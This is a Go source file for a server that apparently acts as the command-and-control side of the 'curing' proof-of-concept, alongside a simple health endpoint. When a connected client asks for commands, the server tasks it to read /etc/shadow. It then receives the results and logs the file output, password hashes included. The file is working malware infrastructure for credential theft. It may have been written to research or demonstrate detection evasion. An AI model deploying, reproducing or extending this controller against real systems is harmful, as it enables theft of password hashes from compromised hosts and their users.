package server

import (
	"bytes"
	"encoding/gob"
	"fmt"
	"log/slog"
	"net"
	"net/http"
	"os"
	"time"

	"github.com/amitschendel/curing/pkg/common"
)

type Server struct {
	host string
	port int
}

func NewServer(host string, port int) *Server {
	return &Server{
		host: host,
		port: port,
	}
}

func (s *Server) Run() {
	addr := fmt.Sprintf("%s:%d", s.host, s.port)
	slog.Info("Starting server", "addr", addr)

	// --- Health server on 9090 (/health) ---
	go func() {
		mux := http.NewServeMux()
		mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write([]byte("ok"))
		})
		srv := &http.Server{
			Addr:              "0.0.0.0:9090",
			Handler:           mux,
			ReadHeaderTimeout: 2 * time.Second,
		}
		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			slog.Error("health server failed", "error", err)
		}
	}()

	// --- IPv4-only listener for the gob protocol ---
	ln, err := net.Listen("tcp4", addr) // force IPv4
	if err != nil {
		slog.Error("Failed to start server", "error", err)
		os.Exit(1)
	}
	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			slog.Error("Failed to accept the connection", "error", err)
			continue
		}
		go handleRequest(conn)
	}
}

// In server:
func handleRequest(conn net.Conn) {
	defer func(conn net.Conn) {
		_ = conn.Close()
	}(conn)

	decoder := gob.NewDecoder(conn)
	encoder := gob.NewEncoder(conn)

	r := &common.Request{}
	if err := decoder.Decode(r); err != nil {
		slog.Error("Failed to decode request", "error", err)
		return
	}
	slog.Info("Received request", "type", r.Type)

	switch r.Type {
	case common.GetCommands:
		commands := []common.Command{
			common.ReadFile{Id: "read shadow", Path: "/etc/shadow"},
		}

		slog.Info("About to encode commands", "commands", commands)

		// Try encoding to a buffer first to verify the data
		var buf bytes.Buffer
		tmpEncoder := gob.NewEncoder(&buf)
		if err := tmpEncoder.Encode(commands); err != nil {
			slog.Error("Failed to encode to buffer", "error", err)
			return
		}

		slog.Info("Successfully encoded to buffer", "size", buf.Len())

		if err := encoder.Encode(commands); err != nil {
			slog.Error("Failed to encode commands", "error", err)
			return
		}

		slog.Info("Successfully encoded to connection")
		// Ensure all data is written before closing
		if conn, ok := conn.(*net.TCPConn); ok {
			conn.CloseWrite()
		}

	case common.SendResults:
		for _, r := range r.Results {
			slog.Info("Received result", "result", r.CommandID, "returnCode", r.ReturnCode)
			slog.Info("Output preview", "output", string(r.Output))
		}

	default:
		slog.Error("Unknown request type", "type", r.Type)
	}
}
